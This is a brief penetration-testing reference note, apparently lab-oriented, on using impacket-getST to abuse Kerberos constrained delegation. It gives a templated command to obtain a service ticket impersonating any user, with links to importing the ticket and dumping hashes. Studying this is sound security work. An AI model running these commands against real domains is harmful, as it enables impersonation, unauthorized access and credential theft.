# impacket-getST.py

> Retrieve Kerberos service tickets from a KDC.

---

## Abuse a Constrained Delegation Privilege to Generate a Service Ticket for Any User to a Host for which a SPN is Configured from Linux

```bash
impacket-getST $DOMAIN/$USER[:$PASSWORD] -dc-ip $DC_HOSTNAME_OR_IP -spn $SPN -impersonate $USERNAME_TO_IMPERSONATE [-hashes [$LMHASH]:[$NTHASH]]
```

- `$DOMAIN/$USER` is the domain and username of the principal who has the constrained delegation privilege on `$SPN`
- `$PASSWORD` or `$LMHASH` or `$NTHASH` is the credential of the principal who has the constrained delegation privilege on `$SPN`
- `$SPN` format: `$SERVICE/$COMPUTER`
	- Example: `WWW/dc.intelligence.htb`

If the ticket is successfully generated, it will be written to a file in the current directory named `$USERNAME_TO_IMPERSONATE.ccache`. It will grant access to the `$SPN`'s `$COMPUTER` as the user `$USERNAME_TO_IMPERSONATE`.

[[using-kerberos-tickets#Importing a Kerberos Ticket into impacket|Import the ticket into impacket]] and [[using-kerberos-tickets#Using Kerberos Tickets in impacket Tools|use it]] ([[dumping-hashes|dump hashes]], perhaps?).